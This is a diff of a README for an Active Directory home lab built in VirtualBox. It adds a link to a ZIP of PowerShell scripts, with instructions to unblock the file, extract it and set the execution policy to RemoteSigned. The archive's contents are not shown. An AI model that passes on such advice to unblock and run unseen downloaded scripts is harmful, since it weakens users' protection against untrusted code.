@@ -1,20 +1,48 @@
 # Active Directory Home Lab
-
 ### [YouTube Demonstration](https://youtu.be/7eJexJVCqJo)
 
+🔽 **Download PowerShell Scripts for This Lab**:  
+[AD_PS-master.zip](https://github.com/devrsx/ActiveDirectoryLab/raw/main/AD_PS-master.zip)  
+
 ## Description  
-Learn Active Directory by building a home lab with Oracle VirtualBox.
+Step-by-step guide to build an Active Directory lab using Oracle VirtualBox. Perfect for learning Windows networking and AD management.
 
-## Tools
-- PowerShell
-- Diskpart
+## Tools Used  
+- <b>PowerShell</b> (Scripts included in download)  
+- <b>Diskpart</b>  
+- <b>VirtualBox</b> 6.1+  
 
-## Environment
-- Windows 10 (21H2)
+## Environment  
+- <b>Windows 10</b> (21H2) host  
+- <b>Windows Server</b> 2019/2022 guest  
 
 ---
 
-### Step 1: Download VirtualBox
+## Lab Guide
+
+### Pre-Lab Setup: PowerShell Scripts
+<p align="center">
+<em>PowerScripts folder with AD management modules</em><br/>
+<img src="images/ps-scripts.png" width="80%" alt="PowerShell Scripts"/>
+</p>
+
+• **Action**  
+   ‣ Download [AD_PS-master.zip](https://github.com/devrsx/ActiveDirectoryLab/raw/main/AD_PS-master.zip)  
+   ‣ Right-click > Properties > Unblock  
+   ‣ Extract to `C:\AD_Scripts`  
+• **Settings**  
+   ‣ Execution Policy: `RemoteSigned`  
+   ‣ Required: PowerShell 5.1+  
+• **Explanation**  
+   ‣ Automates user/OU creation  
+   ‣ Contains lab-ready templates  
+• **Common Mistake**  
+   ‣ Forgetting to unblock ZIP  
+   ‣ Running scripts as non-admin  
+
+---
+
+### Step 1:Introduction & Overview
 <p align="center">
 <em>Official VirtualBox download page showing version selection</em><br/>
 <img src="images/1.png" width="80%" alt="Download VirtualBox"/>
@@ -33,23 +61,30 @@ Learn Active Directory by building a home lab with Oracle VirtualBox.
 
 ---
 
-### Step 2: Install VirtualBox
+---
+
+### Step 2: Download VirtualBox
 <p align="center">
-<em>VirtualBox installation wizard with progress bar</em><br/>
-<img src="images/2.png" width="80%" alt="Install VirtualBox"/>
+<em>VirtualBox download page showing version selection</em><br/>
+<img src="images/1.png" width="80%" alt="Download VirtualBox"/>
 </p>
 
 • **Action**  
-   ‣ Run installer as Administrator  
-   ‣ Complete setup wizard  
+   ‣ Download Oracle VirtualBox installer  
+   ‣ Download Extension Pack (adds USB/clipboard features)  
 • **Settings**  
-   ‣ Accept all defaults  
-   ‣ Install both components  
+   ‣ Install VirtualBox with defaults  
+   ‣ Install Extension Pack after main installation  
 • **Explanation**  
-   ‣ Core virtualization platform setup  
+   ‣ Extension Pack enables critical VM features:  
+      • Shared clipboard  
+      • Drag-and-drop  
+      • USB device support  
 • **Common Mistake**  
-   ‣ Skipping Extension Pack installation  
+   ‣ Forgetting Extension Pack limits functionality  
+   ‣ Installing wrong architecture (32-bit vs 64-bit)  
 
+---
 ---
 
 ### Step 3: VirtualBox Interface
